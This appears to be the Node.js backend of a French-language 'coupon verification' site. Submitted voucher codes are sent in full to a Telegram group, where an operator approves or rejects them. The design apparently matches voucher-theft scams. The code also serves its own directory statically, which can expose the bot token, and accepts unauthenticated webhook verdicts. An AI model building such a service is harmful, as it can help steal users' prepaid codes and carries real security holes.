require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const app = express();
const PORT = process.env.PORT || 3000;

// Mémoire temporaire pour les requêtes (stateless sur Render, mais fonctionne localement)
const codes = {};
const sseClients = {};
// Endpoint SSE pour notifier le client en temps réel
app.get('/api/stream/:requestId', (req, res) => {
    const { requestId } = req.params;
    res.set({
        'Content-Type': 'text/event-stream',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
    });
    res.flushHeaders();
    // Garde la connexion ouverte
    sseClients[requestId] = res;
    req.on('close', () => {
        delete sseClients[requestId];
    });
});

app.use(bodyParser.json());
app.use(express.static(__dirname)); // Sert index.html et les images

// Endpoint pour la requête de vérification
app.post('/api/request', (req, res) => {
    const { code, type, requestId } = req.body;
    if (!code || !type || !requestId) return res.status(400).json({ ok: false, error: 'Paramètres manquants' });
    codes[requestId] = { code, type, status: 'pending' };
    // Envoi du message au bot Telegram
    sendCouponMessage(type, code, requestId);
    res.json({ ok: true });
});

// Endpoint pour le polling du statut
app.get('/api/status/:requestId', (req, res) => {
    const { requestId } = req.params;
    if (!codes[requestId]) return res.json({ status: 'pending' });
    if (codes[requestId].status === 'valid') return res.json({ status: 'valid' });
    if (codes[requestId].status === 'invalid') return res.json({ status: 'invalid' });
    res.json({ status: 'pending' });
});

// Endpoint webhook Telegram
app.post('/api/telegram', (req, res) => {
    const body = req.body;
    if (body.callback_query) {
        const data = body.callback_query.data;
        const requestId = data.split('|')[1];
        if (data.startsWith('OUI|')) {
            codes[requestId].status = 'valid';
            sendResultToUser(requestId, true);
            // Notifie le client SSE si connecté
            if (sseClients[requestId]) {
                sseClients[requestId].write(`data: {"status":"valid"}\n\n`);
                sseClients[requestId].end();
                delete sseClients[requestId];
            }
        } else if (data.startsWith('NON|')) {
            codes[requestId].status = 'invalid';
            sendResultToUser(requestId, false);
            if (sseClients[requestId]) {
                sseClients[requestId].write(`data: {"status":"invalid"}\n\n`);
                sseClients[requestId].end();
                delete sseClients[requestId];
            }
        }
        // Répondre à Telegram pour enlever le "loading"
        fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ callback_query_id: body.callback_query.id })
        });
    }
    res.send('OK');
});

// Fonction pour envoyer le message Telegram avec boutons OUI/NON
function sendCouponMessage(type, code, requestId) {
    const text = `Coupon à vérifier :\nType : ${type}\nCode : ${code}\nID : ${requestId}`;
    fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: process.env.GROUP_ID,
            text,
            reply_markup: {
                inline_keyboard: [[
                    { text: '✅ OUI', callback_data: `OUI|${requestId}` },
                    { text: '❌ NON', callback_data: `NON|${requestId}` }
                ]]
            }
        })
    });
}

// Fonction pour envoyer le résultat au client (optionnel, ici on ne fait rien car le frontend poll)
function sendResultToUser(requestId, isValid) {
    // Ici tu pourrais envoyer un message à l'utilisateur si tu stockais son chat_id
    // Mais dans ce workflow, le frontend attend la réponse via /api/status
}

// Configuration du webhook Telegram
if (process.env.BASE_URL) {
    fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/setWebhook`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ url: `${process.env.BASE_URL}/api/telegram` })
    });
}

app.listen(PORT, () => {
    console.log('Serveur démarré sur le port', PORT);
});
